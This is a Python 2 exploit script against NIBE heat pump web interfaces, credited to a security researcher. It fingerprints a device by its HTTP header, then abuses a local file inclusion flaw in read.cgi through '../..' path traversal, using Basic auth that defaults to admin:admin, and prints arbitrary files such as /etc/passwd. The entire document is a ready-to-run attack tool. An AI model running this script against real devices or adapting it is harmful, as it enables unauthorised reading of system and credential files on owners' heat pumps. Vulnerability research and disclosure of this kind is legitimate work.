#!/usr/bin/python
import socket,sys,os,base64
# NIBE heat pump LFI exploit
#
# Written by Jelmer de Hen
# Published at http://h.ackack.net/?p=302
#
# Special thanks to Fredrik Nordberg Almroth and Mathias Karlsson for obtaining this information http://h.ackack.net/?p=274 which made me test the heat pumps and find the exploits.


def finger_heatpump(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send("GET / HTTP/1.1\n\n")
	header = s.recv(1024)
	s.close()
	if header.find("NIBE") !=-1:
		return 1
	else:
		return 0

def exploit_pump(ip, port, filename, basic_auth):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send("GET /cgi-bin/read.cgi?page=../.."+filename+" HTTP/1.1\nAuthorization: Basic "+basic_auth+"\n\n")
	file = ""
	while s.recv(1024):
		file = file + s.recv(1024)
	s.close()
	return file

def instructions():
	print sys.argv[0]+" [ip] [port] [filename] [username (default=admin)] [password (default=admin)]"
        print "Written by Jelmer de Hen"
        print "published at http://h.ackack.net/?p=302"
	print "Examples:"
	print sys.argv[0]+" 127.0.0.1 80 /etc/passwd"
	print sys.argv[0]+" 127.0.0.1 80 /etc/passwd admin p455w0rd"
	sys.exit(1)

def main():
	if len(sys.argv)==4 or len(sys.argv)==6:
		try:
			ip = sys.argv[1]
			port = int(sys.argv[2])
			filename = sys.argv[3]
		except:
			instructions()
		try:
			basic_auth = base64.b64encode(sys.argv[4]+":"+sys.argv[5])
		except:
			basic_auth = base64.b64encode("admin:admin")

		if finger_heatpump(ip, port) == 1:
			print "[+] Fingerprint scan success"
			file_contents = exploit_pump(ip, port, filename, basic_auth)
			if len(file_contents)==0:
				print "[-] The exploit failed, you can retry the exploit or the username and/or password are not right"
			else:
				print "[+] Contents of "+filename+":"
				print file_contents
		else:
			print "[-] Fingerprint scan failed"

	else:
		instructions()

if __name__ == "__main__":
	sys.exit(main())